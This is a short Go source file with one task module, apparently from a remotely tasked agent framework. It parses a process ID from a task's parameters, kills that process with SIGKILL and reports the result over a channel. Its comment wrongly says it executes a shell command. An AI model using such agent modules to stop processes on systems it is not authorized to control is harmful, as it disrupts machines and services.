package kill

import (
	"fmt"
	"strconv"
	"syscall"

	"github.com/xorrior/poseidon/pkg/utils/structs"
)

//Run - Function that executes the shell command
func Run(task structs.Task, threadChannel chan<- structs.ThreadMsg) {
	tMsg := structs.ThreadMsg{}
	tMsg.Error = false
	tMsg.TaskItem = task

	pid, err := strconv.Atoi(task.Params)

	if err != nil {
		tMsg.TaskResult = []byte(err.Error())
		tMsg.Error = true
		threadChannel <- tMsg
		return
	}

	syscall.Kill(pid, syscall.SIGKILL)

	tMsg.TaskResult = []byte(fmt.Sprintf("Killed process with PID %s", task.Params))
	threadChannel <- tMsg
}
